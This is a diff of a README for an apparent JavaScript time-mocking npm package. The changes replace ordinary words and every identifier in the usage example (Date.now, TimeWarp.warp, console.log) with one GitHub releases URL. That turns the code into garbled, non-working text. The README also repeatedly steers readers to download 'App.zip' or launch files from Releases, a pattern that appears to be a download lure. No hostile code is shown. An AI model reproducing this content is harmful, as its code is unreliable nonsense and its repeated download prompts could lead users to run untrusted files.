@@ -1,7 +1,7 @@
 # ⏳ TimeWarp-Manipulation-Library
 
 ## Description
-Welcome to the TimeWarp Manipulation Library GitHub repository! This library provides an NPM package that enables precise control over time in JavaScript. With this library, you can warp, freeze, or accelerate `Date.now()` with seamless monkey-patching. It's perfect for testing, simulations, and debugging time-sensitive code.
+Welcome to the TimeWarp Manipulation Library GitHub repository! This library provides an NPM package that enables precise control over time in JavaScript. With this library, you can warp, freeze, or accelerate `https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases()` with seamless monkey-patching. It's perfect for testing, simulations, and debugging time-sensitive code.
 
 ## Features
 - Warp time to fast-forward or slow down processes.
@@ -16,18 +16,18 @@ npm install time-warp-manipulation-library
 ```
 
 ## Usage
-Here's a quick example of how you can use the library in your Node.js project:
+Here's a quick example of how you can use the library in your https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases project:
 
 ```javascript
 const TimeWarp = require('time-warp-manipulation-library');
 
 // Warp time by a factor of 2
-TimeWarp.warp(2);
+https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases(2);
 
 // Get the modified time
-const warpedTime = Date.now();
+const warpedTime = https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases();
 
-console.log(warpedTime);
+https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases(warpedTime);
 ```
 
 ## Repository Topics
@@ -53,9 +53,9 @@ console.log(warpedTime);
 - web-development
 
 ## Additional Information
-For more details, documentation, and updates, you can visit the [repository link](https://github.com/project/files/App.zip) for this library.
+For more details, documentation, and updates, you can visit the [repository link](https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases) for this library.
 
-[![](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/project/files/App.zip)
+[![](https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases)](https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases)
 
 If the link does not work or needs launching, please check the "Releases" section of this repository.
 
@@ -65,7 +65,7 @@ Get started with the TimeWarp Manipulation Library and take control of time in y
 ## Explore More
 Explore advanced features, examples, and community contributions to enhance your time manipulation capabilities. Try out the different time-warping options and see how they can revolutionize your development workflow.
 
-![TimeWarp](https://example.com/time-warp.png)
+![TimeWarp](https://github.com/DaniFishh/Time-Warp-Manipulation-Library/releases)
 
 ## Stay Updated
 Don't forget to star ⭐ this repository to stay updated on any new releases, enhancements, or bug fixes. Join our community of time travelers today!
